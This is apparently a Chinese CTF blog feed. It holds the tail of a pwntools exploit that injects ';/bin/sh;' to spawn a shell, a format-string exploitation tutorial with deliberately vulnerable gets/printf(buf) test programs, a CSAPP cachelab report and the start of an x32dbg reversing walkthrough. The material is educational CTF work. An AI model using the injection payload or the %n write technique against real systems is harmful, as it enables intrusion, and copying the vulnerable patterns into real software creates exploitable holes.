class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞利用</title>
      <link href="/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/"/>
      <url>/2021/06/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>格式化字符串漏洞是printf函数比较常见的漏洞，常见的漏洞形式就是<code>printf(s);</code>如果s字符是我们可控的话，那就会导致任意位置读和写等严重的后果。</p><span id="more"></span><p>首先如下代码段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">gets(s);</span><br><span class="line"><span class="built_in">printf</span>(s);</span><br></pre></td></tr></table></figure><p>逻辑看上去十分简单，就是输入什么就输出什么。避免这类漏洞的方式也很简单，固定第一个参数就可以了，但是现在第一个参数我们可控的话就要介绍一些平时用不到的格式化字符串的标识符了。</p><p><code>%d %f %x %s</code>这些烂大街的相信都不用讲也会，讲讲其它的标识符</p><p><code>%p</code>:输出第n个参数的十六进制值，目前测试与<code>%x</code>不一样的地方就是输出会带<code>0x</code>，并且%后面带的整型参数表示第几个参数而非参数长度。</p><p><code>%n</code>:将已打印字符串长度输入到下一个参数所表示的地址去，%后面带的整型参数表示要输出的第几个参数。</p><p>注：以上结论皆是在Ubuntu18.0.4环境下使用gcc编译器得到的</p><p>那么通过以上两个较生僻格式化的标识符就可以达到任意读和任意写了。</p><h2 id="p达到任意读的目的"><a href="#p达到任意读的目的" class="headerlink" title="%p达到任意读的目的"></a>%p达到任意读的目的</h2><p>现在有以下测试程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">while</span>(buf[<span class="number">0</span>]!=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        gets(buf);</span><br><span class="line">        <span class="built_in">printf</span>(buf,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们在64位的环境下编译，所以刚好给6个参数占满寄存器，那么此时我输入一个<code>%6$p</code>就可以直接输出<code>%6$p</code>这个字符串所对应的<code>long</code>的值(因为64位栈的宽度为8字节，所以被迫输出long型整数)</p><p><img src="https://i.loli.net/2021/06/05/eWljw5DEnZ9b1gm.png" alt="format string_1.png"></p><p>这里可以很清楚看到<code>70243625</code>就是字符串<code>%6$p</code>小端输出的结果，如果量一下缓冲区到rbp的距离我们还可以把栈的地址泄露出来，这就是任意读，地址一旦泄露那么可以做的事情就非常多了，如果加了canary甚至可以无视canary溢出。</p><h2 id="n达到任意写目的"><a href="#n达到任意写目的" class="headerlink" title="%n达到任意写目的"></a>%n达到任意写目的</h2><p>我们的测试程序是这样写的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>,c=<span class="number">0</span>,d=<span class="number">0</span>,e=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(buf[<span class="number">0</span>]!=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        gets(buf);</span><br><span class="line">        <span class="built_in">printf</span>(buf,&amp;a,&amp;b,&amp;c,&amp;d,&amp;e);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%d %d %d %d %d\n&quot;</span>,a,b,c,d,e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个测试程序略微化简了一点，要修改的变量地址直接传参进去了，在实际攻击的过程中可不会这么给你提供，你需要算偏移然后将地址给格式化字符串定点修改某个变量的值，这就是所谓的任意写。</p><p><img src="https://i.loli.net/2021/06/05/ZLVsORBKiYxXA5I.png" alt="format string_2.png"></p><p>这里可以看到，通过我的输入成功改变了三个变量的值</p><p>这就是格式化字符串漏洞的利用。。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cachelab实验报告:模拟cache的功能</title>
      <link href="/2021/05/22/cachelab/"/>
      <url>/2021/05/22/cachelab/</url>
      
        <content type="html"><![CDATA[<p><code>lab</code>从这里开始变得难了起来了，这次要模拟计算机里的一个硬件-<code>cache</code>的工作，关于<code>cache</code>，百度百科介绍的比我好，这边请<a href="https://baike.baidu.com/item/CACHE%E5%AD%98%E5%82%A8%E5%99%A8/12789048?fr=aladdin">———&gt;</a></p><span id="more"></span><p>然后咱们就先拿到实验用的文件以及他的<code>writeup</code>，看完一会之后<code>(long long after)</code>就知道了此次实验的目的。然后文件也知道的一清二楚了。</p><p><code>csim.c</code>:用来做part A的主要文件。</p><p>tra<code>n</code>s.c:用来做part B的主要文件。</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p><code>writeup</code>里面已经提到了，<code>cache.h</code>头文件里面有所需的函数并且要在<code>csim.c</code>里面完成<code>cache</code>的模拟过程，那么首先我们看看<code>cache.h</code>头文件提供了哪些东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * cachelab.h - Prototypes for Cache Lab helper functions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CACHELAB_TOOLS_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHELAB_TOOLS_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_TRANS_FUNCS 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">trans_func</span>&#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*func_ptr)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]);</span><br><span class="line">  <span class="keyword">char</span>* description;</span><br><span class="line">  <span class="keyword">char</span> correct;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_hits;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_misses;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num_evictions;</span><br><span class="line">&#125; <span class="keyword">trans_func_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * printSummary - This function provides a standard way for your cache</span></span><br><span class="line"><span class="comment"> * simulator * to display its final hit and miss statistics</span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printSummary</span><span class="params">(<span class="keyword">int</span> hits,  <span class="comment">/* number of  hits */</span></span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">int</span> misses, <span class="comment">/* number of misses */</span></span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">int</span> evictions)</span></span>; <span class="comment">/* number of evictions */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fill the matrix with data */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initMatrix</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The baseline trans function that produces correct results. */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">correctTrans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Add the given function to the function list */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerTransFunction</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> (*trans)(<span class="keyword">int</span> M,<span class="keyword">int</span> N,<span class="keyword">int</span>[N][M],<span class="keyword">int</span>[M][N]), <span class="keyword">char</span>* desc)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CACHELAB_TOOLS_H */</span></span></span><br></pre></td></tr></table></figure><p>用我那-4级的英语水平来翻译大概就是定义了一个结构体，结构体里有测试<code>cache</code>的一些指标，诸如命中次数这些的东西，所以这个结构体就当成<code>cache</code>吧。</p><p>那么就很好写(chao)<code>csim.c</code>的代码了，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="keyword">int</span> help_mode, verbose_mode, s, E, b, S,number_hits, number_miss, number_eviction;</span><br><span class="line"><span class="comment">//S is the number of sets, E is the associativity, b is number of block bits</span></span><br><span class="line"><span class="keyword">char</span> filename[<span class="number">1000</span>];<span class="comment">//The file name</span></span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">1000</span>];<span class="comment">//The buffer of input</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> valid_bit, tag, stamp;<span class="comment">//cold miss</span></span><br><span class="line">&#125;cache_line;</span><br><span class="line">cache_line **cache = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max_stamp = INT_MIN, max_stamp_id = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span>  t_address, s_address;<span class="comment">// The t value and s value of address</span></span><br><span class="line">    s_address = (address &gt;&gt; b) &amp; ((<span class="number">-1U</span>) &gt;&gt; (<span class="number">32</span> - s));<span class="comment">//use bit manipulation to get s_address, -1U equals to INT_MAX</span></span><br><span class="line">    t_address = address &gt;&gt; (s + b);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)<span class="comment">//check whether there is a hit</span></span><br><span class="line">        <span class="keyword">if</span>(cache[s_address][i].tag == t_address)<span class="comment">//which means a hit</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//is_placed = 1;</span></span><br><span class="line">            cache[s_address][i].stamp = <span class="number">0</span>;<span class="comment">//restart the time stamp control unit</span></span><br><span class="line">            number_hits++;</span><br><span class="line">            <span class="comment">//printf(&quot;hit\n&quot;);</span></span><br><span class="line">            <span class="keyword">return</span> ;<span class="comment">//just return now</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//to check whether is an empty line</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">        <span class="keyword">if</span>(cache[s_address][i].valid_bit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[s_address][i].valid_bit = <span class="number">1</span>;</span><br><span class="line">            cache[s_address][i].tag = t_address;</span><br><span class="line">            cache[s_address][i].stamp = <span class="number">0</span>;</span><br><span class="line">            number_miss++;<span class="comment">//compulsory miss</span></span><br><span class="line">            <span class="comment">//printf(&quot;miss\n&quot;);</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//If there is not any empty line, then an eviction will occur</span></span><br><span class="line">    number_eviction++;</span><br><span class="line">    number_miss++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">        <span class="keyword">if</span>(cache[s_address][i].stamp &gt; max_stamp)</span><br><span class="line">        &#123;</span><br><span class="line">            max_stamp = cache[s_address][i].stamp;</span><br><span class="line">            max_stamp_id = i;</span><br><span class="line">        &#125;</span><br><span class="line">    cache[s_address][max_stamp_id].tag = t_address;</span><br><span class="line">    cache[s_address][max_stamp_id].stamp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_time</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">//update the time stamp of each cache line</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">            <span class="keyword">if</span>(cache[i][j].valid_bit == <span class="number">1</span>)<span class="comment">//if valid</span></span><br><span class="line">                cache[i][j].stamp++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt, temp;<span class="comment">//The getopt return value</span></span><br><span class="line">    <span class="keyword">char</span> type;<span class="comment">//type of a single trace record</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> address;<span class="comment">//address of memory</span></span><br><span class="line">    number_hits = number_miss = number_eviction = <span class="number">0</span>;<span class="comment">//initialization</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">-1</span> != (opt = (getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(opt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:help_mode = <span class="number">1</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:verbose_mode = <span class="number">1</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:s = atoi(optarg);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:E = atoi(optarg);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:b = atoi(optarg);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:<span class="built_in">strcpy</span>(filename, optarg);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(help_mode == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;cat help_info&quot;</span>);<span class="comment">//&quot;help_info&quot; is a text file containing help information</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FILE* fp = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;The File is wrong!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    S = (<span class="number">1</span> &lt;&lt; s); <span class="comment">// S equals to 2^s</span></span><br><span class="line">    cache = (cache_line**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line*) * S);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        cache[i] = (cache_line*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line) * E);<span class="comment">//Important! malloc each row of cache</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[i][j].valid_bit = <span class="number">0</span>;</span><br><span class="line">            cache[i][j].tag = cache[i][j].stamp = <span class="number">-1</span>;</span><br><span class="line">        &#125;<span class="comment">//initialization</span></span><br><span class="line">    <span class="keyword">while</span>(fgets(buffer,<span class="number">1000</span>,fp))<span class="comment">//get a whole line</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(buffer,<span class="string">&quot; %c %xu,%d&quot;</span>, &amp;type, &amp;address, &amp;temp);<span class="comment">//hexdecimal</span></span><br><span class="line">        <span class="keyword">switch</span>(type)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:update(address);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:update(address);<span class="comment">//just let it fall through, do twice</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:update(address);</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        update_time();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">        <span class="built_in">free</span>(cache[i]);<span class="comment">//free allocated space first</span></span><br><span class="line">    <span class="built_in">free</span>(cache);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    printSummary(number_hits, number_miss, number_eviction);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试：</p><p><img src="https://i.loli.net/2021/05/23/qTi9oVAtbpeRYnk.png" alt="Cachelab_PartA_1.png"></p><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p>优化矩阵转置函数，使得cache miss尽可能少,不超过12个临时变量</p><h3 id="32-x-32"><a href="#32-x-32" class="headerlink" title="32 x 32"></a>32 x 32</h3><p>直接转置是肯定不行的，这都不用去试(实则败而归来)。众所周知，分块是一个很好用的算法</p><p>32位字节的数据，一个int4字节，每行/列有8个int，我们将其分块为8x8，进行处理</p><p>充分利用这些变量即可写出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(M == <span class="number">32</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i, j, k, v1, v2, v3, v4, v5, v6, v7, v8;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j += <span class="number">8</span>)</span><br><span class="line">                <span class="keyword">for</span>(k = i; k &lt; (i + <span class="number">8</span>); ++k)</span><br><span class="line">                &#123;</span><br><span class="line">                    v1 = A[k][j];</span><br><span class="line">                    v2 = A[k][j+<span class="number">1</span>];</span><br><span class="line">                    v3 = A[k][j+<span class="number">2</span>];</span><br><span class="line">                    v4 = A[k][j+<span class="number">3</span>];</span><br><span class="line">                    v5 = A[k][j+<span class="number">4</span>];</span><br><span class="line">                    v6 = A[k][j+<span class="number">5</span>];</span><br><span class="line">                    v7 = A[k][j+<span class="number">6</span>];            </span><br><span class="line">                    v8 = A[k][j+<span class="number">7</span>];</span><br><span class="line">                    B[j][k] = v1;</span><br><span class="line">                    B[j+<span class="number">1</span>][k] = v2;</span><br><span class="line">                    B[j+<span class="number">2</span>][k] = v3;</span><br><span class="line">                    B[j+<span class="number">3</span>][k] = v4;</span><br><span class="line">                    B[j+<span class="number">4</span>][k] = v5;</span><br><span class="line">                    B[j+<span class="number">5</span>][k] = v6;</span><br><span class="line">                    B[j+<span class="number">6</span>][k] = v7;</span><br><span class="line">                    B[j+<span class="number">7</span>][k] = v8;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个暂时先立个flag在这里，等之后会做了再做吧，后面的真的做的不太行了。。。</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>动态调试工具的使用</title>
      <link href="/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/05/22/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>做了这么久的<code>pwn</code>之后又得兼顾一下<code>re</code>了哈哈哈。废话不多说，这周学了动态调试器的使用，并且轻松解出了那几道题目。</p><span id="more"></span><p><code>linux</code>下的动态调试器都知道，<code>gdb</code>永远的神，<code>windows</code>的动态调试器就比较各色了，<code>ollydbg</code>，<code>x32dbg</code>，<code>x64dbg</code>。这里我用的是后两个调试器，<code>ollydbg</code>听师傅们说是不更新了还是咋地也不知道，所以就用了x32和<code>x64dbg</code>，其实看了一下界面都差不多的。</p><p>动态调试注意的就是下断点，改值这一系列操作，让程序按照你想的执行。比如有一个函数就是直接输出<code>flag</code>，但是它直接又没有完全直接给你，那怎么办？我直接改<code>eip</code>去执行那个函数不就ok了？与<code>pwn</code>不一样，<code>pwn</code>我要通过漏洞去执行，这个的话文件控制权限和这台计算机的权限全部在我手上，它怎么运行我说的算，对不对？那么接下来看几道例题，这个不是说只有动调能做，但是会动调一定比不会的占优势，这是真的。</p><h2 id="xctf-game"><a href="#xctf-game" class="headerlink" title="xctf-game"></a><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5074&page=1">xctf-game</a></h2><p>下载文件并且根据它的描述可以看到是一个32位PE文件且是一个类似游戏的程序，逻辑很简单，输入序列然后通过它函数的判断就可以让程序输出<code>flag</code>。但是</p><p><img src="https://i.loli.net/2021/05/22/ufkspBM3bHW1VgN.png" alt="xctf_game_1.png"></p><p>这个函数不仅复杂，直接从这里破解可以但是比较难，要从外面实现又比较苛刻那么此时我们开启动调然后直接改eip执行这个函数。</p><p>x32dbg打开查看内存映射，发现textbss的基址是0x101000</p><p><img src="https://i.loli.net/2021/05/22/ezy8HXpV3x7nGq4.png" 